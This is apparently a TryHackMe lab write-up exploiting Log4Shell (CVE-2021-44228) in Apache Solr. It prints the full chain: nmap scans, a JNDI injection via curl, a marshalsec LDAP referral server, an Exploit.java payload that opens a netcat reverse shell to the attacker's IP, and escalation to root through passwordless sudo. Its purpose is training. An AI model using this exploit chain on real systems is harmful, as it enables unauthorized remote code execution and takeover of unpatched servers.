**Log4j**

Apache Log4j is a Java-based logging utility originally written by Ceki Gülcü. It is part of the Apache Logging Services, a project of the Apache Software Foundation. Log4j is one of several Java logging frameworks.

**What is apache  solr**

Solr is an open-source enterprise-search platform, written in Java. Its major features include full-text search, hit highlighting, faceted search, real-time indexing, dynamic clustering, database integration, NoSQL features and rich document handling.

**Log4j attack**

On December 9th, 2021, the world was made aware of a new vulnerability identified as CVE-2021-44228, affecting the Java logging package log4j. This vulnerability earned a severity score of 10.0 (the most critical designation) and offers remote code trivial remote code execution on hosts engaging with software that utilizes this log4j version. This attack has been dubbed "Log4Shell"

```web

Reference:

https://github.com/fullhunt/log4j-scan

https://www-bleepingcomputer-com.cdn.ampproject.org/v/s/www.bleepingcomputer.com/news/security/new-zero-day-exploit-for-log4j-java-library-is-an-enterprise-nightmare/amp/?amp_js_v=a6&amp_gsa=1&usqp=mq331AQKKAFQArABIIACAw%3D%3D#aoh=16392146824983&amp_ct=1639214693284&referrer=https%3A%2F%2Fwww.google.com&amp_tf=From%20%251%24s&ampshare=https%3A%2F%2Fwww.bleepingcomputer.com%2Fnews%2Fsecurity%2Fnew-zero-day-exploit-for-log4j-java-library-is-an-enterprise-nightmare%2F

https://logging.apache.org/log4j/2.x/security.html

https://www.lunasec.io/docs/blog/log4j-zero-day-severity-of-cve-2021-45046-increased/

https://github.com/zhuowei/GhidraLog4Shell

https://twitter.com/fullhunt/status/1470275912449105930?s=24
```

**Starting Lab THM**

Starting with nmap scan -sV and -sC 

```bash
nmap -sV -sC 10.10.67.21                                                                            130 ⨯
Starting Nmap 7.91 ( https://nmap.org ) at 2021-12-19 00:01 EST
Nmap scan report for 10.10.67.21
Host is up (0.19s latency).
Not shown: 937 closed ports, 61 filtered ports
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e2:35:e1:4f:4e:87:45:9e:5f:2c:97:e0:da:a9:df:d5 (RSA)
|   256 b2:fd:9b:75:1c:9e:80:19:5d:13:4e:8d:a0:83:7b:f9 (ECDSA)
|_  256 75:20:0b:43:14:a9:8a:49:1a:d9:29:33:e1:b9:1a:b6 (ED25519)
111/tcp open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|_  100000  3,4          111/udp6  rpcbind
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 28.24 seconds
```

Not getting the solr service then Started Scanning with -p-

```bash 
nmap -p- -sV 10.10.67.21     
Starting Nmap 7.91 ( https://nmap.org ) at 2021-12-19 00:14 EST
Stats: 0:04:54 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 24.23% done; ETC: 00:33 (0:14:39 remaining)
Stats: 0:17:44 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 37.25% done; ETC: 01:01 (0:29:31 remaining)
Stats: 0:31:23 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 64.10% done; ETC: 01:03 (0:17:27 remaining)
Nmap scan report for 10.10.67.21
Host is up (0.18s latency).
Not shown: 65532 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
111/tcp  open  rpcbind 2-4 (RPC #100000)
8983/tcp open  http    Apache Solr
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 3145.17 seconds
```

Apache Solr is runnig on port 8983

```bash
nmap -p8983 10.10.67.21 -sV
Starting Nmap 7.91 ( https://nmap.org ) at 2021-12-19 00:59 EST
Nmap scan report for 10.10.67.21
Host is up (0.16s latency).

PORT     STATE SERVICE VERSION
8983/tcp open  http    Apache Solr

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 26.83 seconds
```

accessing that using web browser 

```bash
firefox http://10.10.67.21:8983/
```
![[Pasted image 20211219113432.png]]

We got lot of logs and there are some imp directories 

```
-Dsolr.log.dir : /var/solr/logs
```

And before we getting into Log4j attack we must aware of some terms like what is LDAP and JNDI and JNDI injection so on ..

**Java Naming and Directory Interface (JNDI)**

The Java Naming and Directory Interface is a Java API for a directory service that allows Java software clients to discover and look up data and resources via a name. Like all Java APIs that interface with host systems, JNDI is independent of the underlying implementation.

**Lightweight Directory Access Protocol (LDAP)**

The Lightweight Directory Access Protocol is an open, vendor-neutral, industry standard application protocol for accessing and maintaining distributed directory information services over an Internet Protocol network.

**jndi-injections-java**

```web
https://www.veracode.com/blog/research/exploiting-jndi-injections-java
```

While searching about the apache solr got some interesting api (for injecting params)

```web
/admin/cores?
```

```web 
referance of how to use coreadmin api

https://solr.apache.org/guide/6_6/coreadmin-api.html
```

**Testing log4j is possible or not **

```bash 
mr4dot

$ nc -nlvp 9001
```

```bash 
mr4dot

$ curl '10.10.2.185:8983/solr/admin/cores?hello=$\{jndi:ldap://10.9.0.246:9001\}'
{
  "responseHeader":{
    "status":0,
    "QTime":0},
  "initFailures":{},
  "status":{}}
                                                                   
```

```bash 
mr4dot

$ nc -nlvp 9001                                                                                        1 ⨯
listening on [any] 9001 ...
connect to [10.9.0.246] from (UNKNOWN) [10.10.2.185] 39326
0
 `�

```

We need to setup the our java version to java 1.8.0_181 

Steps to setup it locally 

Donwload java from mirror 
```web
http://mirrors.rootpei.com/jdk/
```

Download below version of jdk 

```jdk-8u181-linux-x64.tar.gz```

```bash 
$ mkdir /usr/lib/jvm 
```

```bash 
$ tar xzvf ~/Downloads/jdk-8u181-linux-x64.tar.gz
```

```bash 
$ sudo update-alternatives --install "/usr/bin/java" "java" "/usr/lib/jvm/jdk1.8.0_181/bin/java" 1
$ sudo update-alternatives --install "/usr/bin/javac" "javac" "/usr/lib/jvm/jdk1.8.0_181/bin/javac" 1
$ sudo update-alternatives --install "/usr/bin/javaws" "javaws" "/usr/lib/jvm/jdk1.8.0_181/bin/javaws" 1

```

```bash
$ sudo update-alternatives --set java /usr/lib/jvm/jdk1.8.0_181/bin/java
$ sudo update-alternatives --set javac /usr/lib/jvm/jdk1.8.0_181/bin/javac
$ sudo update-alternatives --set javaws /usr/lib/jvm/jdk1.8.0_181/bin/javaws
```

```bash
$ java -version
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
java version "1.8.0_181"
Java(TM) SE Runtime Environment (build 1.8.0_181-b13)
Java HotSpot(TM) 64-Bit Server VM (build 25.181-b13, mixed mode)
```

Build marshalsec with the Java builder maven so we need to install maven first 

**Maven**

Maven is a command-line tool for building Java applications; it is written in Java and is used for building JVM programs. Therefore, it is necessary that Java is installed into the system prior to installing and using Maven.

```bash 
$ sudo apt install maven
```

marshalsec setup 

```bash 
$ git clone https://github.com/mbechler/marshalsec

$ cd marshalsec
```

To build marshalsec run the command in marshalsec folder.

```bash 
$ mvn clean package -DskipTests
```

LDAP referral server to direct connections to our secondary HTTP server setup command (run in marshalsec folder)

```bash 
$ java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://10.9.1.21:9999/#Exploit"
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
Listening on 0.0.0.0:1389
```

LDAP server runnign on port 1389

Create a java payload for reverse connection ```Exploit.java```

```java 
public class Exploit {
    static {
        try {
            java.lang.Runtime.getRuntime().exec("nc -e /bin/bash 10.9.1.21 9090");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```

Serve it on same port we used to start LDAP Ref Server 

```bash 
$ python3 -m http.server 9999
Serving HTTP on 0.0.0.0 port 9999 (http://0.0.0.0:9999/)
```

Start Listener using nc 

```bash 
$ nc -nlvp 9090
```

calling the payload using curl command 

```bash
$ curl '10.10.226.102:8983/solr/admin/cores?cmd=$\{jndi:ldap://10.9.1.21:1389/Exploit\}'

{
  "responseHeader":{
    "status":0,
    "QTime":0},
  "initFailures":{},
  "status":{}}
```

Woohoo!!!! Got Shell 

```bash 
nc -nlvp 9090              
listening on [any] 9090 ...
connect to [10.9.1.21] from (UNKNOWN) [10.10.226.102] 44250
whoami
solr
```
![[Pasted image 20211220153717.png]]

Spawning shell 

```bash
$ python3 -c "import pty; pty.spawn('/bin/bash')"
$ export TERM=xterm
```

Root access

```bash
solr@solar:/opt/solr/server$ sudo -l
sudo -l
Matching Defaults entries for solr on solar:
    env_reset, exempt_group=sudo, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User solr may run the following commands on solar:
    (ALL) NOPASSWD: ALL
solr@solar:/opt/solr/server$ su bash 
su bash 
No passwd entry for user 'bash'
solr@solar:/opt/solr/server$ sudo bash
sudo bash
root@solar:/opt/solr-8.11.0/server# passwd
passwd
Enter new UNIX password: 123.com

Retype new UNIX password: 123.com

passwd: password updated successfully
root@solar:/opt/solr-8.11.0/server# 

```

```bash 
$ ssh solr@10.10.226.102
```
